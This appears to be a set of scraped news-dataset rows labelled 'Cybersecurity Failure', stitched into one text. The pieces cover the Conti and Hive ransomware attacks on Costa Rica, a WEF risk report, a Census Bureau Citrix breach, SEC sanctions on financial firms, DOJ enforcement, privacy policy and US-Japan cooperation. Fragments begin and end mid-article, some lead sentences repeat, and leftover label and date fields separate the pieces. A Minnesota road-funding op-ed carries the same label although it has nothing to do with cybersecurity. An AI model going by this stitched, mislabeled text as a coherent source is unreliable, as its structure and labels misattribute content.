You can’t invest enough to be 100% secure. But since a budget must be set, it is crucial that companies guarantee they have an excellent security team with the appropriate expertise to tackle technical problems and understand vulnerabilities inside the core critical functions of the business. By doing that, the company will be better prepared to allocate investment where it is most needed. Companies should evaluate their level of protection and their risk tolerance before they engage in new investments. Two ways to do this are through simulations of cyber-attacks and from penetration/vulnerability tests. These actions expose vulnerabilities, enable actions to minimize potential damage based on priority, risk exposure and budget, and ultimately ensure appropriate investment of time, money, and resources.

Boards have a unique role in helping their organizations manage cybersecurity threats. They do not have day to day management responsibility, but they do have oversight and fiduciary responsibility. Don’t leave any questions about critical vulnerabilities for tomorrow. Asking the smart questions at your next board meeting might just prevent a breach from becoming a total disaster.

(The finance ministry did not respond to WIRED’s request for comment.)","For the last two months, Costa Rica has been under siege. Two major ransomware attacks have crippled many of the country’s essential services, plunging the government into chaos as it scrambles to respond. Officials say that international trade ground to a halt as the ransomware took hold and more than 30,000 medical appointments have been rescheduled, while tax payments have also been disrupted. Millions have been lost due to the attacks, and staff at affected organizations have turned to pen and paper to get things done.

Costa Rica’s government, which changed midway through the attacks after elections earlier this year, has declared a “national emergency” in response to the ransomware—marking the first time a country has done so in response to a cyberattack. Twenty-seven government bodies were targeted in the first attacks, which ran from mid-April until the start of May, according to new president Rodrigo Chaves. The second attack, at the end of May, has sent Costa Rica’s health care system into a spiral. Chaves has declared “war” on those responsible.

At the heart of the hacking spree is Conti, the notorious Russia-linked ransomware gang. Conti claimed responsibility for the first attack against Costa Rica’s government and is believed to have some links to the ransomware-as-a-service operation HIVE, which was responsible for the second attack impacting the health care system. Last year, Conti extorted more than $180 million from its victims, and it has a history of targeting health care organizations. However, in February thousands of the group’s internal messages and files were published online after it backed Russia’s war against Ukraine.

Even among Conti’s long rap sheet of more than 1,000 ransomware attacks, those against Costa Rica stand out. They mark one of the first times a ransomware group has explicitly targeted a nation’s government, and during the process Conti uncharacteristically called for the Costa Rican government to be overthrown. “This is possibly the most significant ransomware incident to date,” says Emsisoft threat analyst Brett Callow. “I can’t recall another occasion when an entire federal government has been held to ransom like this—it’s a first; it’s quite unprecedented.”

What’s more, researchers suggest that Conti’s brazen actions may just be callous showboating, enacted to draw attention to the group as it winds down its toxic brand name and its members move on to other ransomware efforts.

“National Emergency”

The first ransomware attack against Costa Rica’s government started during the week of April 10. Throughout the week, Conti probed the systems of the Ministry of Finance, known as Ministerio de Hacienda, explains Jorge Mora, a former director of the Ministry of Science, Innovation, Technology and Telecommunications (MICIT) who helped lead the response to the attacks. By the early hours of April 18, files within the finance ministry had been encrypted and two key systems had been crippled: the digital tax service and the IT system for customs control.

“They affect all the export/import services in the country of the products,” says Mora, who left the government on May 7 ahead of the administration change. Mario Robles, the CEO and founder of Costa Rican cybersecurity company White Jaguars, estimates that “several terabytes” of data and more than 800 servers at the finance ministry have been impacted. Robles says his company has been involved in the response to the attacks but says he cannot name who it has worked with. (The finance ministry did not respond to WIRED’s request for comment.)

“The private sector was very affected,” Mora says. Local reports say import and export businesses faced shipping container shortages and estimated losses range from $38 million per day up to $125 million over 48 hours. “The disruption paralyzed the imports and exports of the country, making a big impact on the commerce,” says Joey Milgram, a country manager for Costa Rica at cybersecurity company Soluciones Seguras. “They implemented, after 10 days, a manual form to import, but it was taking much paperwork and many days to process,” Milgram adds.",Cybersecurity Failure,2022-06-12 11:00:00

Both areas of law, properly delineated, have the welfare of individual consumers as their prime concern. Privacy and data security laws seek to give consumers control and protection by limiting the collection and sharing of data, subject to consumer consent, and imposing obligations on companies to safeguard their systems from bad actors. Competition law is focused on preserving consumers’ choices in the market, including on terms such as price or quality, which can include aspects of privacy.

Unfortunately, Congress is considering several antitrust bills that put privacy and competition values in sharp conflict, with privacy likely to come out the loser. The bills prioritize the “right” of business users to access the user data and systems of large U.S. tech platforms over an individual user’s privacy rights and these companies’ ability to police against hacks and other abuses of their systems and devices.

For example, one proposal pending in the Senate forces access to or interoperability with U.S. tech companies’ operating systems, hardware and software and discourages these platforms from providing enhanced privacy and security for fear of facing harsh antitrust penalties if they did not choose at the time what a regulator, in hindsight, deems a sufficiently narrow means of protection or a sufficiently “significant” threat.

These bills make consumers’ privacy and security interests subservient to the interests of an almost unlimited set of business users, who may include entities owned or controlled by foreign governments. But this position runs counter to what U.S. consumers want. A new survey by Trusted Future, where I am a board member, and the National Security Institute found that most Americans want a higher level of security for online data. Moreover, they trust American companies significantly more with their data than foreign companies and especially foreign governments.

The risks to data privacy and security from easy access to online data and operating systems is not a theoretical concern. The Federal Trade Commission (FTC), which I recently led as acting chairman and commissioner, has brought numerous cases against companies that have engaged in inadequate protection of consumers’ personal data and their own systems. These cases include instances where a platform did not secure itself against third-party hackers or failed to supervise other platform users appropriately.

The proposed legislation may cause large American tech platforms to face an irreconcilable conflict between providing easy access to business users and the FTC’s sensible requirement that companies secure their systems from abuse.

Worse yet, it is far from clear that these provisions, which threaten to undermine platform and device security and user privacy, will lead to a more competitive marketplace. For instance, the provisions to compel data sharing and mandate broad interoperability are based on assumptions that this would promote competition. Yet, there is no evidence to suggest that this is the case. In fact, the bills are likely to diminish the incentive and ability to compete on security and privacy, something that we have seen drive significant innovation in recent years.

Rather than risk diminishing consumer privacy and security through antitrust legislation, Congress should adopt a comprehensive consumer privacy framework that creates a level playing field for all competitors.

Such a framework should consist of five core principles. First, legislation should provide a national and uniform set of protections and consumer rights throughout the digital economy. Second, it should ensure strong enforcement that protects consumer information that could result in harm if disclosed or misused, while also allowing companies to provide and develop innovative products and services that consumers want.

Third, it should provide consumers clarity and visibility into companies’ data collection, use and sharing practices. This should include easily understandable choices regarding these practices that are calibrated to the sensitivity of that data. Fourth, legislation should be more comprehensive than current state laws. And fifth, federal privacy legislation should be enforced by the FTC, which has the experience and skill to meaningfully enforce the new law’s protections, supplemented by state attorneys general.

On June 14, the House Energy and Commerce Committee will hold an important hearing to discuss bipartisan legislation on data privacy and security. This is an important first step towards Congress meaningfully addressing current privacy problems.

Policymakers should be cautious about trading known privacy and security benefits for easy access to the user data and systems of online platforms by a broad collection of “business users” based on uncertain presumptions that such access will increase competition. A comprehensive national privacy framework that protects consumers and puts all competitors on an equal regulatory footing would better harmonize privacy and competition law and avoid creating a contradictory web of regulation.

Researchers recently revealed that the UAE is one of the most targeted countries in the region when it comes to Advanced Persistent Threats

Dubai - Experts say that ransomware is becoming a dangerously growing threat and presents a major concern for public safety

by Rohma Sadaqat Published: Tue 18 Jan 2022, 4:12 PM

Cybersecurity failure has been identified among the top 10 risks that have worsened the most since the start of the Covid-19 pandemic, new research by the World Economic Forum (WEF) has revealed.

According to the WEF’s ‘The Global Risks Report 2022’, the risk of cybersecurity failure is ranked among the top five concerns for several small, highly digitalised economies, including the UAE, Denmark, Japan, and Singapore. Four countries — Australia, Great Britain, Ireland and New Zealand — ranked it as the number one risk. In addition, 85 per cent of the Cybersecurity Leadership Community of the WEF have stressed that ransomware is becoming a dangerously growing threat and presents a major concern for public safety.

The WEF report also noted that already-stretched IT and cybersecurity professionals are under an increasing burden, not only because of the expansion of remote work, but also because of the growing complexity of regulations for data and privacy, even though such regulations are critical to ensuring public trust in digital systems. There is also an undersupply of cyber professionals — a gap of more than three million worldwide — who can provide cyber leadership, test and secure systems, and train people in digital hygiene.

Experts have stressed that a continued lack of cybersecurity professionals could ultimately hamper economic growth, although new initiatives to “democratize” cybersecurity, for example, by providing free cybersecurity risk management tools, could help fill some of the gaps for small businesses or other institutions.

Renaud Deraison, CTO and co-founder of Tenable, said that it is “unsurprising” that cybersecurity failure ranks among the top five risks in the Middle East region, as widespread dependency on digital systems intensified to facilitate our professional, social and recreational needs during the pandemic.

“This reliance combined with the continued democratisation of the use of digital currencies creates an explosive situation where attackers are financially motivated to ply their trade,” he explained. “Pandora’s box has been opened and organisations are left exposed to cyber vulnerabilities across critical infrastructure, supply chains, businesses - all threatening to disrupt our way of life.”

Similarly, Kaspersky researchers recently revealed that the UAE is one of the most targeted countries in the region when it comes to Advanced Persistent Threats (APT). They have worked on 49 investigative reports related to 16 cyber gangs actively targeting the country since the start of the pandemic in 2020. Kaspersky has found that these APT groups primarily target the UAE’s governmental and diplomatic institutions as well as educational organisations. Other targeted entities include financial institutions, IT companies, healthcare, law firms, military and defence.

“Targeted threats are getting more and more sophisticated every day,” said Abdessabour Arous, a security researcher at Kaspersky. “Today, all organisations have a pressing need to stay informed; as this allows security teams to predict what the attacker’s next move would be and take appropriate steps to protect themselves against future incidents.”

Deraison said that the next two years will truly test the mettle of the world’s digital systems, as both skilled and unskilled cybercriminals replicate successful methods of attacks from 2021, take advantage of ransomware-as-a-service kits, and go after known but unpatched vulnerabilities. The same things cybersecurity professionals have warned about for years.

“If both the public and private sectors don’t increase the barriers to entry by collectively raising the standards of cybersecurity, malicious activities will far outpace societies’ ability to effectively prevent them,” he warned. “Organisations must do everything they can to demonstrate strong corporate governance around cybersecurity and weave it into the fabric of their digital infrastructure. If organisations are still relying on cyber strategies from two years ago, the increasing numbers of cyberattacks provides an impetus to rethink their approach to managing cyber risk in this new normal.”

According to the report, security teams spend more than half their time (54%) manually producing reports for the Board, regulators and auditors.","Data from a survey of 1,200 enterprise security leaders reveals that an increase in tools and manual reporting combined with control failures are contributing to the success of threats such as ransomware, which costs organizations an average of $1.85 million in recovery, according to Panaseer.

Control failures lead to cybersecurity incidents

Currently, only 36% of security leaders feel very confident in their ability to prove controls were working as intended. This is despite 99% of respondents believing it’s valuable to know that all controls are fully deployed and operating within policy, and cybersecurity control failures are currently being listed as the top emerging risk in the latest Gartner Emerging Risks Monitor Report. Attacks only succeed when they hit systems that haven’t been patched or don’t have security controls monitoring them.

82% of security leaders have been surprised by a security event, incident, or breach that evaded a control(s) thought to be in place. It takes multiple control failures for an attack to be successful. In their experience, the respondents stated that it took an average of five or more control failures for an event, incident or breach to succeed.

The report also confirmed that only 40% of security leaders can confidently understand and remediate underperforming controls and track improvement. 60% of the security leaders lack strong confidence in their ability to continuously measure security controls that mitigate the infiltration, propagation, and exploitation of a successful ransomware attack.

Security teams are grappling to manage a growing number of security tools

The rise in threats and shift to cloud-enabled remote working has increased the number of security tools used by large enterprises. On average, enterprise security teams are grappling to manage 76 discrete security tools, a significant jump from 2019 when the average was 64. An increase in tools can also increase reporting requirements.

According to the report, security teams spend more than half their time (54%) manually producing reports for the Board, regulators and auditors. This is an increase of over a third from 2019 when security teams spent on average 40% of their time manually producing reports. The main tasks involved in manual reporting include: extracting data, moving data, cleaning data, merging data, making calculations and formatting and presenting data.

Databases topped the list of assets into which security teams had least visibility (27%), followed by devices (17%) and then Internet of things (16%). The lack of visibility around databases correlates with a sharp rise in ransomware attacks, which have quadrupled during the pandemic and the National Cyber Security Centre recently cited as “the most immediate danger to UK businesses.”

Jonathan Gill, CEO, Panaseer: “The number of security tools continues to grow to meet the increasing threat and fast-evolving technology landscape. These tools produce vast amounts of data, but unfortunately, the data does not always join together, and this has now become a data science problem.”

“Many organizations try to resolve this with spreadsheets and other in-house solutions that simply increase the reporting and administration burden on precious cybersecurity resources. It’s almost impossible to understand an organization’s assets, the status of controls relating to those assets, and the business context or ownership of the associated vulnerabilities. Most attacks happen despite organizations having invested in controls to defend themselves, but finding those controls were not deployed across all assets as intended.”

When asked what changes they have experienced since the beginning of the pandemic, security leaders cited a 42% increase in unpatched vulnerabilities, and 46% more events, 42% more incidents and 47% increase in breaches.",Cybersecurity Failure,2021-12-01 08:00:00

However, investigators found that officials were informed of the flaw in its servers and had at least two opportunities to fix it before the attack, mainly due to lack of coordination between teams responsible for different security tasks, according to the report, published Tuesday by the U.S. Department of Commerce Office of Inspector General. The bureau also lagged in its discovery and reporting of the attack after it happened.

The report details and reviews the incident that occurred on Jan. 11, 2020, when attackers used the publicly available exploit for a critical flaw to target remote-access servers operated by the bureau.



Citrix released a public notice about the zero-day flaw—tracked as CVE-2019-19781–in December. In January, a representative from the bureau’s Computer Incident Response Team (CIRT_ attended two meetings in which the flaw was discussed and attendees even received a link to steps to use fixes which already had been issued by Citrix.

“Despite the publicly available notices released in December and attending two meetings on the issue in January, the bureau CIRT did not coordinate with the team responsible for implementing these mitigation steps until after the servers had been attacked,” according to the report. Doing so could have prevented the attack, investigators noted.

‘Partially Successful’ Attack

The Citrix products affected by the flaw–discovered by Mikhail Klyuchnikov, a researcher at Positive Technologies—are used for application-aware traffic management and secure remote access, respectively. At least 80,000 organizations in 158 countries—about 38 percent in the U.S.—use these products, formerly called NetScaler ADC and Gateway.

The initial compromise at the Census Bureau was on servers used to provide the bureau’s enterprise staff with remote-access capabilities to production, development and lab networks. The servers did not provide access to 2020 decennial census networks, officials told investigators.

“The exploit was partially successful, in that the attacker modified user account data on the systems to prepare for remote code execution,” according to the report. “However, the attacker’s attempts to maintain access to the system by creating a backdoor into the affected servers were unsuccessful.”

Attackers were able to make unauthorized changes to the remote-access servers, including the creation of new user accounts, investigators reported. However, the bureau’s firewalls blocked the attacker’s attempts to establish a backdoor to communicate with the attacker’s external command and control infrastructure.

Other Mistakes

Another security misstep the bureau took that could have mitigated the attack before it even happened was that it was not conducting vulnerability scanning of the remote-access servers as per federal standards and Commerce Department policy, according to the OIG.

“We found that the bureau vulnerability scanning team maintained a list of devices to be scanned,” investigators wrote. “However, the remote-access servers were not included on the list, and were therefore not scanned. This occurred because the system and vulnerability scanning teams had not coordinated the transfer of system credentials required for credentialed scanning.”

The bureau also made mistakes after the attack by not discovering nor reporting the incident in a timely manner, the OIG found.

IT administrators were not aware that servers were compromised until Jan. 28, more than two weeks after the attack, because the bureau was not using a a security information and event management tool (SIEM) to proactively alert incident responders of suspicious network traffic, investigators found.",Cybersecurity Failure,2021-08-19 07:00:00

With the average cost of a data breach reaching an all-time high of $4.24 million, the business case for cybersecurity has never been stronger. Still, some businesses seem to misunderstand the urgency of meeting current cybersecurity standards.

It may help to consider the legal consequences of poor cybersecurity. While the United States has no comprehensive nationwide cybersecurity law, American companies can still face legal trouble if they fail to meet certain standards. Various state, industry, and international regulations still apply to many businesses.

Understanding how cybersecurity standards affect companies’ legal standing can help encourage tighter security. In that spirit, here’s a glimpse at how failure to meet various regulations can result in legal consequences.

Ramifications of International Regulations

Perhaps the most well-known cybersecurity law is the European Union’s General Data Protection Regulation (GDPR). While this is a European law, it can still apply to some U.S. companies. If a U.S. business partners with firms or stores data in the E.U. or collects European customers’ data, they may fall under the jurisdiction of the GDPR.

Similarly, China’s new Data Security Law applies to non-Chinese companies if they store data within China or collect it from Chinese citizens. While regulations like these may not affect most U.S. businesses, noncompliance can carry hefty ramifications for those that do.

Fines for noncompliance with the Chinese Data Security Law start around $15,000 and can reach as high as $1.55 million. The GDPR is similarly punitive, charging up to tens of millions of dollars in some situations. Under both, non-compliant companies could risk losing their license to operate in other countries, as well.

Industry-Specific Standards

Many specific industries carry their own cybersecurity regulations, as well. The most notable of these is the Health Insurance Portability and Accountability Act (HIPAA), which affects companies that handle health care data. Given how sensitive this information is, covered entities under HIPAA must meet strict standards.

These organizations must consider the security of their third-party apps and services as well as their own systems. For example, some teleconference software like Zoom features HIPAA-compliant systems, but not all options do. Using a third-party app that doesn’t meet these regulations could put companies in legal jeopardy.

HIPAA violations can cost as much as $50,000 per violation, up to $1.5 million a year. Severe enough violations can result in criminal charges and jail time. Other industry-specific regulations are similar, like the Gramm-Leach-Bliley Act (GLBA), which covers financial information and can result in hefty fines and jail time.

Government Contracts

Companies that hold government contracts may find themselves subject to even higher standards. These contracts can be lucrative, but failure to comply with their cybersecurity standards will incur substantial penalties, including the loss of these profitable positions. Even past failures can create legal trouble if a company attempts to gain a government contract.

For example, in 2019, Aerojet faced False Claims Act allegations related to their past noncompliance. Aerojet had previously failed to meet relevant cybersecurity standards and didn’t disclose this failure when the Department of Defense (DoD) awarded them a contract. Even though the cybersecurity standards in question didn’t directly apply to their work with the DoD, they still faced trouble because of them.

Government agencies expect their contractors to meet certain standards. Failure to meet them, or in Aerojet’s case, failure to disclose their security shortcomings beforehand, can lead to legal action.

State Legislature

The federal government may not have comprehensive cybersecurity legislation in place, but many states do. One of the most notable, and a pioneer of state cybersecurity regulations, is the California Consumer Privacy Act (CCPA). Like the GDPR or Data Protection Law, the CCPA can apply to non-Californian companies under some circumstances.

The CCPA, like other state cybersecurity legislation, deals mostly in transparency. Companies must be clear with consumers about the kinds of data they collect and give them more control over what happens to it. As cybersecurity becomes a more prominent issue, more states will likely adopt similar policies.

Under the CCPA, data breaches can result in fines of $750 per customer per incident or actual damages, whichever is greater. If a breach affected 10,000 customers, the noncompliance fee could reach $7.5 million. Companies can also face fines of $7,500 per violation if they don’t remedy noncompliance after the state notifies them.

Cybersecurity Compliance Is More Crucial Than Ever

Governments across the world are taking cybersecurity more seriously, and so should businesses. Apart from the direct losses of a data breach, non-compliant companies could face hefty fees, loss of business, and even jail time under these growing regulations. No business has any excuse to ignore cybersecurity standards anymore.

Preparation is always better than damage control. Businesses should act now to ensure they comply with all relevant cybersecurity laws. Failure is too costly to risk.

On one road in my neighborhood, it was unsafe for oncoming traffic to pass farm equipment.
Why would Minnesota legislators pass that up when so many roads in both rural and urban Minnesota are deteriorating?
You know, I may never drive on roads around Roseau or Duluth, but I think the people who live and work and raise food in those areas need good roads, too.","You know how lawyers say they’re practicing law and doctors say they practice medicine? I’ve been practicing farming for more than 50 years in Yellow Medicine County and I haven’t gotten it all figured out yet. I farm between Granite Falls and Hanley Falls, raising corn and soybeans.

When I started farming, corn yielded about 80 bushels to the acre. Today, my corn yields about 200 bushels to the acre. A lot of the roads we drive on today were designed and built when corn yielded less than 100 bushels to the acre and was transported to market in a single axle truck carrying 200 bushels. Now, most corn yields more than 200 bushels to the acre and is carted to market in a semi-trailer carrying 1,000 bushels.

For those who are wondering what an acre is, it’s about the size of a football field.

Many of our roads aren’t designed to handle the traffic they’re carrying today. In addition to the semis, today’s farm equipment is much bigger and heavier than 50 years ago. On one road in my neighborhood, it was unsafe for oncoming traffic to pass farm equipment. There was no shoulder on the narrow county road and the ditch was straight up and down. Following a recent redesign and reconstruction, the road is much safer and there’s room for two vehicles to pass — even when one of the vehicles is a farm tractor or self-propelled sprayer.

Seeing the difference that redesign and reconstruction made is one of the reasons I’m disappointed the Legislature went home without passing matching funds to secure infrastructure money from the federal government. I’ve read the state match ranges from 2% to 7% to leverage up to $7.3 billion in federal dollars, with $5.454 billion targeted to transportation projects. That sounds like a great deal to me. Why would Minnesota legislators pass that up when so many roads in both rural and urban Minnesota are deteriorating?

Portions of the state highways in my area — 212, 23, 67 and 59 — have been rebuilt and portions are desperately in need of fixing. The bumps, cracks and holes cause more wear-and-tear on vehicles and make driving them a two-hands-on-the-wheel-pothole-dodging adventure.

As I understand it, the federal infrastructure money can be used for all sorts of projects, from roads and bridges to ports and airports and cybersecurity and electric vehicle charging.

By failing to pass the matching dollars, our legislators didn’t get their job done, and there’s a lot of fixing that won’t get done. It’s incredibly short-sighted.

Legislators also failed to act on a public works bonding bill. As long as I’ve been following politics, the second year of session was a bonding year. Gov. Tim Walz proposed $100 million for roads and $100 million for bridges. This investment would have helped improve our state.

You know, I may never drive on roads around Roseau or Duluth, but I think the people who live and work and raise food in those areas need good roads, too. It’s the job of state legislators to look out for the best interests of the state and make sure everyone can get safely where they need to go.

The way I look at it is if you eat, you have an interest in making sure the roads and bridges in rural Minnesota are in good shape so we can get the food from the field to the processing plant. Those of us in rural Minnesota have an interest in making sure the roads and bridges in the metro area are in good condition so we can get the food from the processing plant to the table.

We all depend on each other. Where are the statesmen and stateswomen who are willing to work together to achieve a deal that’s best for the state?",Cybersecurity Failure,2022-06-13 14:08:11

“Today, we are launching a Civil Cyber Fraud Initiative,” Deputy Attorney General Lisa Monaco said at the virtual Aspen Institute Cyber Summit. “For too long, companies have chosen silence under the mistaken belief that it’s less risky to hide a breach than to bring it forward and to report it. Well, that changes today.”

Monaco said the initiative will allow the Justice Department to use its authorities under the False Claims Act to fine government contractors that “fail to follow required cybersecurity standards.”

“We are going to go after that behavior and extract very hefty fines, so this is a tool that we have to ensure that taxpayer dollars are used appropriately and to guard the public trust, and that is what we are going to do with respect to this civil fraud initiative,” Monaco said.

She added that protections will be provided to whistleblowers who report violations of federal cybersecurity standards by government contractors.

The new effort follows a wave of cyberattacks against critical organizations, including the SolarWinds hack, which allowed Russian government-linked hackers to compromise numerous federal agencies for much of 2020. Ransomware attacks against companies like Colonial Pipeline, meat producer JBS USA and IT company Kaseya have also wreaked havoc over the past year.

In response to the attacks, bipartisan lawmakers in the House and Senate have introduced several bills that would require federal agencies, critical infrastructure owners and operators and other organizations to report major breaches to the federal government.

Monaco wrote in a CNBC op-ed on Wednesday that Congress needs to take action to help “solve the ransomware threat” by approving breach reporting legislation.

“Congress can help close this gap by enacting legislation to create a national standard for reporting cyber incidents that pose significant risk, including ransomware and incidents that affect critical infrastructure and their supply chains,” she wrote.

In addition, Monaco on Wednesday announced that the Justice Department will establish a National Cryptocurrency Enforcement Team in an effort to “dismantle” cryptocurrency exchanges that are often used by hackers to facilitate ransomware payments by victims.

“We have been enforcing the securities law for decades, we police fraud on the markets, with insider trading cases, or market manipulation cases, and the point of course is to protect consumers and to ensure we can all have confidence in the markets that we are engaging in,” Monaco said.

“The same has got to be true as the technology advances, we need to evolve with it,” she said. “Cryptocurrency exchanges want to be the banks of the future, well, we need to make sure that folks have confidence when they are using these systems, and we need to make sure we are poised to root out abuse that can take hold on them, so the national cryptocurrency enforcement team is something we are launching today.”

This isn’t the first time the Justice Department has announced new steps to combat the rise in cyberattacks. The agency established a ransomware task force in April, and last month created a program to train prosecutors on how to handle cybersecurity cases.

The ongoing spate of ransomware attacks that have taken place over the past year underscores the need for better cooperation and information sharing between the federal government and private sector companies, cybersecurity experts say. From last year's SolarWinds data breach to the more recent Colonial Pipeline and Kaseya hacks, cyberthreats show no signs of abating. But with the right partnerships in place and robust cooperation and transparency among companies and the government, the disruption and damage they cause can be reduced. Cyber experts note that the Biden administration has already made significant moves to address this growing problem. More money has been directed towards agencies such as the Cybersecurity and Infrastructure Security Agency and the General Services Administration's Technology Modernization Fund. In May, Biden signed an executive order with new federal cybersecurity guidelines, including, among other measures, the creation of a cybersecurity safety review board for examining the aftermath of data breaches and cyberattacks. On Wednesday, the CEOs of Amazon, Apple, and Microsoft are set to meet with Biden at the White House to discuss cybersecurity. The meeting will reportedly focus on how the private sector and government can better work together to detect and prevent further attacks, especially those that affect critical infrastructure services. ""We know we can't stop every cyber attack out there, but if we can get to a point where the number of victims is far fewer then it's a much more manageable situation,"" said Jamil Farshchi, chief information security officer at Equifax. ""We can't do that without a strong partnership with the government and being able to have information sharing across all different industries.""

A need for more talent

Among the more urgent needs to enable greater transparency between the private sector and the federal government is more cyber talent. The American Rescue Plan passed in March allocated $200 million toward tech hiring, notes Dan Schiappa, chief product officer at cybersecurity firm Sophos. ""Approximately one in three cybersecurity roles in the public sector are still unfilled,"" he says. ""That's about 33,000 jobs and with a CISA vetting process that can take up to a year for new hires, there's no time to waste."" To speed this process up, Schiappa says the Biden administration should streamline processes like background checks to get qualified people into those roles more quickly. This would apply to both long-time public servants as well as private-sector hires who bring skills the federal government needs. Getting the necessary cyber talent in the private sector is going to take more than expanding the pipeline, says Simone Petrella, co-founder and CEO of CyberVista, a cybersecurity workforce development company. ""There are currently about 460,000 open jobs in cybersecurity and waiting to get more talent into the field isn't going to make a dent in this need,"" she says. Instead, companies should be identifying employees with foundational IT talent that can be upskilled into cybersecurity roles. ""Someone in a general IT role already understands networks, they know how to do privileged access, so you can train them in security technical skills,"" Petrella says.

The other thing employers can do, she adds, is to be more open-minded about bringing on entry-level talent. ""This is more of a long-term people growth strategy that focuses on providing them with the job skills training they need in a measurable and meaningful way,"" Petrella says. ""Companies need to spend the time to inventory their cyber roles and really understand specifically what you need this talent to do.""

In its findings, the SEC said none of the hacked accounts were protected in a manner consistent with Cetera policies.
While the SEC does engage in cyber enforcement actions, Monday's announcement stands out for its focus on failures protecting customer data.","The U.S. Securities and Exchange Commission charged three financial services companies for failing to uphold cybersecurity procedures, which resulted in the exposure of thousands of customers' personal information.

The SEC announced Monday it sanctioned the broker-dealer and investment advisory firms in three actions for cybersecurity failures after threat actors gained unauthorized access to personally identifiable information (PII) for customers and clients by hacking into cloud-based email accounts. The three companies, Cetera Financial Group, Cambridge Investment Research and KMS Financial Services Inc., have agreed to settle the charges without admitting to or denying the SEC's findings. Individual fines waver from $200,000 to $300,000.

The findings include violations against regulations designed to protect confidential customer information like the Safeguards Rule, as well as improper breach notification to clients. The Safeguards Rule requires every broker-dealer and investment adviser registered with the SEC to adopt written policies and procedures reasonably designed to safeguard customer records and information.

Cetera is charged with neglecting both. According to the SEC filing, between November 2017 and June 2020, ""accounts of over 60 Cetera Entities' personnel were taken over by unauthorized third parties, resulting in the exposure of … PII of at least 4,388 customers and clients."" In its findings, the SEC said none of the hacked accounts were protected in a manner consistent with Cetera policies.

Additionally, the order found that Cetera Advisors LLC and Cetera Investment Advisers LLC sent breach notifications to the firms' clients that included ""misleading template language suggesting that the notifications were issued much sooner than they actually were after the discovery of the incidents."" According to the litigation, ""the breach notifications referred to the incidents as 'recent' and stated that the representatives had 'learned that an unauthorized individual gained access' to the recipient's PII two months before the breach notification."" However, the order stated, each firm had learned of the breach at least six months earlier.

For one of Cetera's firms, it was not the first run-in with the SEC. In August 2019, Cetera Advisors LLC was charged with ""breaching its fiduciary duty and defrauding its retail advisory clients by, among other things, failing to disclose conflicts of interest related to the firm's receipt of over $10 million in undisclosed compensation.""

Cetera declined to comment on the charges of deficient cybersecurity procedures.

The incident which led to the sanction of Cambridge Investment Research occurred between January 2018 and July of this year. In that timespan, email accounts of over 121 Cambridge representatives were taken over, resulting in the PII exposure of at least 2,177 customer and clients.

""The SEC's order finds that although Cambridge discovered the first email account takeover in January 2018, it failed to adopt and implement firm-wide enhanced security measures for cloud-based email accounts of its representatives until 2021, resulting in the exposure and potential exposure of additional customer and client records and information,"" the press release said.

In an email to SearchSecurity, Cambridge said it does not comment on regulatory matters, but it has and does maintain a comprehensive information security group and procedures to ensure clients' accounts are fully protected.

Seattle-based broker KMS, which was acquired by Ladenburg Thalmann and Co. Inc. in 2014, is being charged after the email accounts of 15 advisors, or their assistants, were accessed from September 2018 to December of 2019. The attack resulted in the PII exposure of approximately 4,900 KMS customers and clients.

According to the press release, the SEC order found that ""KMS failed to adopt written policies and procedures requiring additional firm-wide security measures until May 2020, and did not fully implement those additional security measures firm-wide until August 2020, placing additional customer and client records and information at risk."" In the litigation, the SEC said ""it was approximately 21 months after discovery of the first breach, in which approximately 2,700 emails of one KMS financial adviser were exposed for a period of 26 days during which unauthorized third parties forwarded the financial adviser's emails to an email address outside of the firm.""

Part of KMS' written policy and procedures, according to the filing, state that financial advisers were obligated to adhere to KMS' Computer and Network Security Policies (CNSP). While the CNSP required maintaining strong passwords, the use of antivirus and secure wireless networks, it did not require the use of multifactor authentication for accessing sensitive data.

KMS did not respond to requests for comment.

While the SEC does engage in cyber enforcement actions, Monday's announcement stands out for its focus on failures protecting customer data. Many companies and individuals recently sanctioned by SEC cyber enforcement actions have allegedly defrauded customers and defied financial regulations regarding cryptocurrency, initial coin offerings, selling digital assets and more.

For example, in October of last year, the SEC charged the late John McAfee for promoting investments in initial coin offerings to his Twitter followers without disclosing that he was paid to do so. Combined with indictments from the Department of Justice, McAfee was subsequently arrested. Actor Steven Seagal also made the list for failing to disclose payments he received for promoting an investment in an initial coin offering.",Cybersecurity Failure,2021-08-31 07:00:00

U.S.-Japan cooperation on cybersecurity and critical infrastructure should be framed to take into account the technology and industry conception of applications, platforms, and infrastructure layers.","U.S. President Joe Biden and Japanese Prime Minister Fumio Kishida’s May 2021 summit in Tokyo reaffirmed the countries’ security alliance and moved on to focus on cooperation in several areas related to technology and innovation. The Competitiveness and Resilience Partnership includes areas such as the digital economy, 5G network infrastructure, cybersecurity and critical infrastructure resilience, science and technology cooperation (including startup collaboration), civil space cooperation, export controls, and supply chain resilience in sectors such as semiconductors, along with information sharing in areas such as batteries and rare earth elements.

The evolution of the U.S.-Japan security alliance into a multidomain technology and innovation pact is a welcome development for both sides. It is in the U.S. interest to have Japan as a close ally with dense economic ties, especially given that the advent of digital tools has created vast new areas for mutually beneficial cooperation beyond traditional trade relationships. Deeper and broader economic ties with the United States are also good for Japan, where many remain nervous about the possibility of an abrupt American about-face in both security and economic affairs if future electoral outcomes bring about a new administration.

However, there are several challenges that both countries will need to overcome to realize the full potential of their cooperation. A recurring theme is the need for both sides to understand the business and industry logic of how and where the private sector creates value. Second, policy coordination among multiple government organizations in each country will be necessary, since different agencies on both sides pursuing their own focused agendas can end up undermining the broader collaboration the two countries need to embrace.

Fostering a Shared Startup Ecosystem Infrastructure for Innovation

The first challenge is ensuring effective flows of funding for facilitating innovation while maintaining private sector incentives. Much of this science and technology cooperation will occur as publicly funded research from universities and research labs is brought to market by startups. Linking the two countries’ startup ecosystems across the Pacific will be a critical aspect of technology collaboration.

Startup ecosystems include not only the startups themselves and venture capitalists, but also large firms that invest in and buy startups; flexible labor markets; and supportive businesses such as law firms, accounting firms, accelerators, and incubators. Connecting the U.S. and Japanese startup ecosystems entails numerous connections: large firms from the two countries investing in each other’s startups, the cross-Pacific movement of entrepreneurs and workers, and startups from both sides working with universities and government personnel on both sides.

